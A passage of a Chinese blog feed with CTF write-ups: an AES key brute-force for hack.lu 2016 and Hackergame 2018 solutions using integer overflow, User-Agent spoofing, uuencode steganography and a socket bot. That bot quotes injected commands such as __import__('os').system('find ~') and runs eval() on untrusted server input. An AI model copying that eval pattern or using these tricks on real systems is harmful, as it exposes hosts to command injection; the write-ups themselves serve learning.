class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> raw[len(raw)-ord(s):]==ord(s)*s:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>最后一个字节是<code>chr(0)</code>肯定不正确，最后一个字节是<code>chr(1)</code>倒是有可能正确，正好缺了一个字节，但只会发生在填充最原始的明文的时候，因为第二轮开始加密的都是上一轮的密文，都是 AES 分组大小的倍数，不可能差一个字节，而且爆破的过程中如果解密出来最后一个字节正好是 chr(1),就会认为填充正确，判断错误的几率还是很大的，所以代码里直接返回 False 了。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> AESCipher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPadding</span><span class="params">(raw)</span>:</span></span><br><span class="line">    s=raw[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> s==chr(<span class="number">0</span>) <span class="keyword">or</span> s==chr(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> raw[len(raw)-ord(s):]==ord(s)*s:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">flag_enc=open(<span class="string">"flag.encrypted"</span>).read()</span><br><span class="line"></span><br><span class="line">dict=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.printable:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> string.printable:</span><br><span class="line">        dict.append(hashlib.sha256(x+y).digest())</span><br><span class="line"></span><br><span class="line">cipher=flag_enc</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> dict:</span><br><span class="line">        raw=AESCipher(key).decrypt(cipher)</span><br><span class="line">        <span class="keyword">if</span> checkPadding(raw):</span><br><span class="line">            cipher=AESCipher._unpad(raw)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;len(cipher)<span class="number">-1</span>:</span><br><span class="line">    <span class="keyword">if</span> cipher[i]==<span class="string">'1'</span>:</span><br><span class="line">        flag+=chr(int(cipher[i:i+<span class="number">3</span>]))</span><br><span class="line">        i=i+<span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=chr(int(cipher[i:i+<span class="number">2</span>]))</span><br><span class="line">        i=i+<span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>需要注意的是解密出来的明文是一串数字:<br><code>12010997110123651081141019710012145761019711411010110045676667458097100100105110103125</code><br>用正常 <code>hex解码</code>是乱码，观察发现首部 120,109,97 都像是 ascii 值，数字其实是 flag 字符串每个字符十进制 ascii 值连起来的。</p><blockquote><p>运行结果： xman{Already-Learned-CBC-Padding}</p></blockquote><p>参考：</p><ol><li><p><a href="https://github.com/ctfs/write-ups-2016/tree/master/hack.lu-ctf-2016/crypto/cryptolocker-200" target="_blank" rel="noopener">hack.lu 2016 原题目</a></p></li><li><p><a href="https://p-te.fr/2016/10/20/hack-lu-cryptolocker/" target="_blank" rel="noopener">https://p-te.fr/2016/10/20/hack-lu-cryptolocker/</a></p></li><li><p><a href="https://gophers-in-the-shell.herokuapp.com/hack-lu-2016-cryptolock-crypto-200-pts/" target="_blank" rel="noopener">https://gophers-in-the-shell.herokuapp.com/hack-lu-2016-cryptolock-crypto-200-pts/</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackergame 2018</title>
      <link href="/2018/10/16/hackergame2018/"/>
      <url>/2018/10/16/hackergame2018/</url>
      
        <content type="html"><![CDATA[<p>做了做中科大的hackergame，感觉不是传统的CTF，偏重于趣味性。做了一天多就没做了…</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>提交 hackergame2018 即可，但是输入框进行了限制，改一下输入框限制大小就可以了(或者抓包发)。</p><blockquote><p>flag{Hackergame2018_Have_Fun!}</p></blockquote><a id="more"></a><h3 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答"></a>猫咪问答</h3><p>emmmmm 中科大的特色题，问的就是中科大的一些东西，直接 google 就好了：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-1f363ad2b98247be.png" alt="image.png"></p><blockquote><p>flag{G00G1E-is-always-YOUR-FRIEND}</p></blockquote><h3 id="游园会的集章卡片"><a href="#游园会的集章卡片" class="headerlink" title="游园会的集章卡片"></a>游园会的集章卡片</h3><p>附件给了一堆图片，这个题就是拼图，把图拼起来就好了：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-550250aab6fa5c51.png" alt="flag.png"></p><blockquote><p>flag{H4PPY_1M4GE_PR0CE551NG}  (注意数字1和字母l的区别)</p></blockquote><h3 id="Word-文档"><a href="#Word-文档" class="headerlink" title="Word 文档"></a>Word 文档</h3><p>题目给了一个 OfficeOpenXML.docx，打不开。考虑用 binwalk -e 命令，得到一个压缩包。</p><p>压缩包里发现flag.txt。</p><blockquote><p>flag{xlsx,pptx,docx_are_just_zip_files}</p></blockquote><h3 id="猫咪银行"><a href="#猫咪银行" class="headerlink" title="猫咪银行"></a>猫咪银行</h3><p>题目的意思是原本有 10CTB，通过存款并取出来赚钱，赚够 20CTB去买 flag。但是问题在于有效期就 10 分钟，赚不够 20CTB，取出的时间远远超出 10 分钟。</p><p>尝试把时间输的大一些，发现直接溢出了…<br><img src="https://upload-images.jianshu.io/upload_images/9223743-83b548f2e12df780.png" alt="image.png"><br>直接取出，再换成CTB，去买flag：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-6b317ea6e8af70c5.png" alt="image.png"></p><blockquote><p>flag{Evil_Integer._Evil_Overflow.}</p></blockquote><h3 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h3><p>题目说请使用黑曜石浏览器访问，谷歌一波黑曜石浏览器，发现了官网： <a href="https://heicore.com/index.php" target="_blank" rel="noopener">https://heicore.com/index.php</a></p><p>想要下载浏览器要登录，登录需要注册，注册需要黑曜石浏览器访问… 怀疑这个官网是出题人写的…</p><p>看页面应该是这个浏览器就是个梗，出题人根据官网出的，感觉套路就是抓包把 user-agent 改成这个所谓的黑曜石浏览器的格式，但是问题是 user-agent 格式不清楚。</p><p>应该是这个官网有端倪，这个网站我右键看不了源码… ctrl+u 也不行，F12就崩溃，源码肯定有东西。没办法就直接浏览器手输 view-source:<a href="https://heicore.com" target="_blank" rel="noopener">https://heicore.com</a> 成了。找到了这个：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-fcc6949a899ef97f.png" alt="image.png"><br>应该就是想要的，访问题目地址，抓包改 user-agent：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-9b825c187cfd4ade.png" alt="image.png"></p><blockquote><p>flag{H3ic0re_49.1.2623.213_sai_kou}</p></blockquote><h3 id="回到过去"><a href="#回到过去" class="headerlink" title="回到过去"></a>回到过去</h3><p>题目给了个附件，打开是写 flag 文件的 ed 命令，去照着命令输：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">q</span><br><span class="line">ed</span><br><span class="line">a</span><br><span class="line">flag&#123;</span><br><span class="line">.</span><br><span class="line">a</span><br><span class="line">44a2b8</span><br><span class="line">a3d9b2c</span><br><span class="line">c44039</span><br><span class="line">f93345</span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">2m3</span><br><span class="line">2m5</span><br><span class="line">2m1</span><br><span class="line">2</span><br><span class="line">s/4/t</span><br><span class="line">q</span><br><span class="line">q</span><br></pre></td></tr></table></figure><p>命令不包括保存文件的命令，所以要在最后 q 之前加一个 “w flag.txt” 保存文件，发现成功写入 flag.txt：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-832c1a6fa31ce544.png" alt="image.png"></p><blockquote><p>flag{t4a2b8c44039f93345a3d9b2}</p></blockquote><h3 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h3><h4 id="哲学思考"><a href="#哲学思考" class="headerlink" title="哲学思考"></a>哲学思考</h4><p>提示输入我是谁，到底是什么东西呢？看源码等等找了半天，最后 F12 看到了服务器状态码：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-3fa646eb54744f17.png" alt="image.png"></p><blockquote><p>I’M A TEAPOT</p></blockquote><p>输入 teapot 得到 flag:</p><blockquote><p>flag{i_canN0t_BReW_c0ffEE!}</p></blockquote><h4 id="Can-I-help-me"><a href="#Can-I-help-me" class="headerlink" title="Can I help me?"></a>Can I help me?</h4><p>打开第一问给的链接：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f1784f22c0371f3a.png" alt="image.png"><br>用不同方法访问，抓包改成POST访问：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1c7c243d92c50851.png" alt="image.png"><br>根据提示去看 RFC-7168，发现了 BREW 访问，改成 BREW，提示缺少参数：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c1c0fab5ff63297e.png" alt="image.png"><br>去 RFC-7168 找一下头部参数，发现了这个：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-70fdbc08ea8ab9a1.png" alt="image.png"><br>加一个 Content-Type: message/teapot,给了一个链接：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c941462869272e83.png" alt="image.png"><br>去访问：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-54fe49def5312266.png" alt="image.png"></p><blockquote><p>flag{delivering_tea_to_DaLa0}</p></blockquote><h3 id="猫咪遥控器"><a href="#猫咪遥控器" class="headerlink" title="猫咪遥控器"></a>猫咪遥控器</h3><p>题目给了控制猫行动的指令，U,D,L,R 分别对应上，下，左，右。应该要把图画出来，借助 python 的 turtle 库(据说教小孩子学编程的…)</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t = turtle.Pen()</span><br><span class="line">position=[<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">data=open(<span class="string">"seq.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">"D"</span>:</span><br><span class="line">        position[<span class="number">1</span>]-=<span class="number">0.7</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">"U"</span>:</span><br><span class="line">        position[<span class="number">1</span>]+=<span class="number">0.7</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">"L"</span>:</span><br><span class="line">        position[<span class="number">0</span>]-=<span class="number">0.7</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">"R"</span>:</span><br><span class="line">        position[<span class="number">0</span>]+=<span class="number">0.7</span></span><br><span class="line">    t.goto(position[<span class="number">0</span>],position[<span class="number">1</span>])</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>结果：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-5b1a5955abdb3ca8.jpg" alt="Q"></p><blockquote><p>flag{MeowMeow}</p></blockquote><h3 id="猫咪克星"><a href="#猫咪克星" class="headerlink" title="猫咪克星"></a>猫咪克星</h3><p>nc 过去让计算表达式的值，写个交互脚本发现了问题…算到后面无缘无故退出或者程序终止。</p><p>调试一下发现后面计算的表达式中含有 print,sleep,exit 之类的命令，而我用 eval() 直接执行显然不行，要对接受的表达式进行一点替换，把这些命令替换成 0 ，下面是最后的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Eval</span><span class="params">(shizi)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> shizi.find(<span class="string">"print"</span>)!=<span class="number">-1</span>:</span><br><span class="line">        a = re.findall(<span class="string">"print(..*?\).*?)"</span>, shizi)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">            shizi = shizi.replace(i, <span class="string">""</span>).replace(<span class="string">"print"</span>, <span class="string">"0"</span>)</span><br><span class="line">    <span class="keyword">if</span> shizi.find(<span class="string">"system"</span>)!=<span class="number">-1</span>:</span><br><span class="line">        shizi = shizi.replace(<span class="string">"__import__('os').system('find ~')"</span>, <span class="string">"0"</span>)</span><br><span class="line">    <span class="keyword">if</span> shizi.find(<span class="string">"sleep"</span>)!=<span class="number">1</span>:</span><br><span class="line">        shizi=shizi.replace(<span class="string">"__import__('time').sleep(100)"</span>,<span class="string">"0"</span>)</span><br><span class="line">    <span class="keyword">if</span> shizi.find(<span class="string">"exit()"</span>)!=<span class="number">1</span>:</span><br><span class="line">        shizi=shizi.replace(<span class="string">"exit()"</span>,<span class="string">"0"</span>)</span><br><span class="line">    <span class="keyword">return</span> eval(shizi)</span><br><span class="line">time = <span class="number">1</span></span><br><span class="line">sc = socket.socket()</span><br><span class="line">host = <span class="string">"202.38.95.46"</span></span><br><span class="line">port = <span class="number">12009</span></span><br><span class="line">addr = (host, port)</span><br><span class="line">sc.connect(addr)</span><br><span class="line">print(sc.recv(<span class="number">1024</span>).decode())</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"-----------round &#123;&#125;--------------"</span>.format(time))</span><br><span class="line">    data = sc.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    print(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> data:</span><br><span class="line">        exit()</span><br><span class="line">    shizi = data.split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    result = str(Eval(shizi))</span><br><span class="line">    print(<span class="string">"result:"</span>, result)</span><br><span class="line">    sc.send((result + <span class="string">"\n"</span>).encode())</span><br><span class="line">    time +=<span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{‘Life_1s_sh0rt_use_PYTH0N’*1000}</p></blockquote><h3 id="他的诗"><a href="#他的诗" class="headerlink" title="他的诗"></a>他的诗</h3><p>题目给了一个 poem.txt 和 helper.py 两个文件。</p><p><strong>poem.txt</strong>里面是密文，<strong>helper.py</strong>是一段解密程序。</p><p>运行 helper.py 得到这样一首诗：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">---------</span><br><span class="line">There is something in this world</span><br><span class="line">that no one has ever seen before.</span><br><span class="line">It is gentle and sweet.</span><br><span class="line">Maybe if it could be seen,</span><br><span class="line">everyone would fight over it.</span><br><span class="line">That is why the world hid it,</span><br><span class="line">so that no one could get their hands</span><br><span class="line">on it so easily.</span><br><span class="line">However, someday, someone will find it.</span><br><span class="line">The person who deserves it the most</span><br><span class="line">will definitely find it.</span><br><span class="line">---------</span><br><span class="line">Do you like this school?</span><br><span class="line">I really, really love it.</span><br><span class="line">But nothing can stay unchanged.</span><br><span class="line">Fun things... Happy things...</span><br><span class="line">They can&apos;t all possibly stay unchanged.</span><br><span class="line">Even so,</span><br><span class="line">can you go on loving this place?</span><br><span class="line">---------</span><br><span class="line">Sometimes I wonder,</span><br><span class="line">what if this town was alive?</span><br><span class="line">What if it had thoughts and feelings</span><br><span class="line">like one of us?</span><br><span class="line">If it did,</span><br><span class="line">I think it would want to make the people</span><br><span class="line">who live here happy.</span><br><span class="line">---------</span><br><span class="line">Expectations are what you have</span><br><span class="line">when you have given up.</span><br><span class="line">Expectations are born from</span><br><span class="line">a despairingly large difference in skill.</span><br><span class="line">---------</span><br><span class="line">A joke only lasts for a moment,</span><br><span class="line">if it leaves a misunderstanding,</span><br><span class="line">it becomes a lie.</span><br><span class="line">---------</span><br><span class="line">If someone didn&apos;t have any pride,</span><br><span class="line">wouldn&apos;t they also be lacking</span><br><span class="line">in self-confidence?</span><br><span class="line">If someone was free of greed,</span><br><span class="line">wouldn&apos;t they have trouble</span><br><span class="line">supporting their family?</span><br><span class="line">And if people didn&apos;t envy one another,</span><br><span class="line">wouldn&apos;t they stop inventing new things?</span><br><span class="line">---------</span><br><span class="line">If I don&apos;t have to do it, I won&apos;t.</span><br><span class="line">If I have to do it, I&apos;ll make it.</span><br><span class="line">---------</span><br><span class="line">/* Here is the end of my poem.</span><br><span class="line">Have you ever found my FLAG? :) */</span><br></pre></td></tr></table></figure><p>看了半天这只是一首诗，并没有什么特殊的地方。那么 flag 到底在哪呢？</p><p>把目光放到解密的 py 脚本上，其中一句：</p><blockquote><p>decode_data = decode(data.encode(“ascii”), “uu”)</p></blockquote><p>这个 uu 是不是有特定含义？我改成别的字母发现报错，查了查才知道是 uuencode 编码。</p><p>既然如此，把密文放到<a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">uuencode 在线解密网站</a>进行解密，发现了不一样的地方：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---------There is something in this worldfthat no one has ever seen before.It is gentle and sweet.lMaybe if it could be seen,aeveryone would fight over it.gThat is why the world hid it,&#123;so that no one could get their handson it so easily.STHowever, someday, someone will find it.The person who deserves it the mostewill definitely find it.---------Do you like this school?I really, really love it.gABut nothing can stay unchanged.n0Fun things... Happy things...gThey can&apos;t all possibly stay unchanged.Even so,rcan you go on loving this place?A---------Sometimes I wonder,Phwhat if this town was alive?y_What if it had thoughts and feelingslike one of us?If it did,w1I think it would want to make the peopletHwho live here happy._---------Expectations are what you havewhen you have given up.uExpectations are born fromUa despairingly large difference in skill.e---------A joke only lasts for a moment,Ncif it leaves a misunderstanding,0it becomes a lie.D---------If someone didn&apos;t have any pride,wouldn&apos;t they also be lackingEin self-confidence?_IIf someone was free of greed,5wouldn&apos;t they have trouble_supporting their family?And if people didn&apos;t envy one another,5wouldn&apos;t they stop inventing new things?0_---------If I don&apos;t have to do it, I won&apos;t.fuIf I have to do it, I&apos;ll make it.---------/* Here is the end of my poem.</span><br></pre></td></tr></table></figure><p>咱们看到了花括号<strong>{</strong>，和脚本跑出来解密结果不一样，猜想比脚本解密结果多的部分就是 flag,写个脚本比较一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> difflib</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">a=<span class="string">'''</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">There is something in this world</span></span><br><span class="line"><span class="string">that no one has ever seen before.</span></span><br><span class="line"><span class="string">It is gentle and sweet.</span></span><br><span class="line"><span class="string">Maybe if it could be seen,</span></span><br><span class="line"><span class="string">everyone would fight over it.</span></span><br><span class="line"><span class="string">That is why the world hid it,</span></span><br><span class="line"><span class="string">so that no one could get their hands</span></span><br><span class="line"><span class="string">on it so easily.</span></span><br><span class="line"><span class="string">However, someday, someone will find it.</span></span><br><span class="line"><span class="string">The person who deserves it the most</span></span><br><span class="line"><span class="string">will definitely find it.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">Do you like this school?</span></span><br><span class="line"><span class="string">I really, really love it.</span></span><br><span class="line"><span class="string">But nothing can stay unchanged.</span></span><br><span class="line"><span class="string">Fun things... Happy things...</span></span><br><span class="line"><span class="string">They can't all possibly stay unchanged.</span></span><br><span class="line"><span class="string">Even so,</span></span><br><span class="line"><span class="string">can you go on loving this place?</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">Sometimes I wonder,</span></span><br><span class="line"><span class="string">what if this town was alive?</span></span><br><span class="line"><span class="string">What if it had thoughts and feelings</span></span><br><span class="line"><span class="string">like one of us?</span></span><br><span class="line"><span class="string">If it did,</span></span><br><span class="line"><span class="string">I think it would want to make the people</span></span><br><span class="line"><span class="string">who live here happy.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">Expectations are what you have</span></span><br><span class="line"><span class="string">when you have given up.</span></span><br><span class="line"><span class="string">Expectations are born from</span></span><br><span class="line"><span class="string">a despairingly large difference in skill.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">A joke only lasts for a moment,</span></span><br><span class="line"><span class="string">if it leaves a misunderstanding,</span></span><br><span class="line"><span class="string">it becomes a lie.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">If someone didn't have any pride,</span></span><br><span class="line"><span class="string">wouldn't they also be lacking</span></span><br><span class="line"><span class="string">in self-confidence?</span></span><br><span class="line"><span class="string">If someone was free of greed,</span></span><br><span class="line"><span class="string">wouldn't they have trouble</span></span><br><span class="line"><span class="string">supporting their family?</span></span><br><span class="line"><span class="string">And if people didn't envy one another,</span></span><br><span class="line"><span class="string">wouldn't they stop inventing new things?</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">If I don't have to do it, I won't.</span></span><br><span class="line"><span class="string">If I have to do it, I'll make it.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">/* Here is the end of my poem.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">a=a.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">b=<span class="string">"---------There is something in this worldfthat no one has ever seen before.It is gentle and sweet.lMaybe if it could be seen,aeveryone would fight over it.gThat is why the world hid it,&#123;so that no one could get their handson it so easily.STHowever, someday, someone will find it.The person who deserves it the mostewill definitely find it.---------Do you like this school?I really, really love it.gABut nothing can stay unchanged.n0Fun things... Happy things...gThey can't all possibly stay unchanged.Even so,rcan you go on loving this place?A---------Sometimes I wonder,Phwhat if this town was alive?y_What if it had thoughts and feelingslike one of us?If it did,w1I think it would want to make the peopletHwho live here happy._---------Expectations are what you havewhen you have given up.uExpectations are born fromUa despairingly large difference in skill.e---------A joke only lasts for a moment,Ncif it leaves a misunderstanding,0it becomes a lie.D---------If someone didn't have any pride,wouldn't they also be lackingEin self-confidence?_IIf someone was free of greed,5wouldn't they have trouble_supporting their family?And if people didn't envy one another,5wouldn't they stop inventing new things?0_---------If I don't have to do it, I won't.fuIf I have to do it, I'll make it.---------/* Here is the end of my poem."</span></span><br><span class="line">d = difflib.Differ()</span><br><span class="line">diff = list(d.compare(a,b))</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> diff:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]==<span class="string">'+'</span>:</span><br><span class="line">        flag+=line</span><br><span class="line">flag=flag.replace(<span class="string">"+"</span>,<span class="string">""</span>).replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>得到的 flag 是: flag{STegAn0grAPhy_w1tH_uUeNc0DE_I5_50_fu</p><p>缺了点什么，后面补一下”n}” bingo!</p><blockquote><p>flag{STegAn0grAPhy_w1tH_uUeNc0DE_I5_50_fun}</p></blockquote><h3 id="Z-同学的-RSA"><a href="#Z-同学的-RSA" class="headerlink" title="Z 同学的 RSA"></a>Z 同学的 RSA</h3><p>题目代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">p = sympy.randprime(<span class="number">2</span> ** <span 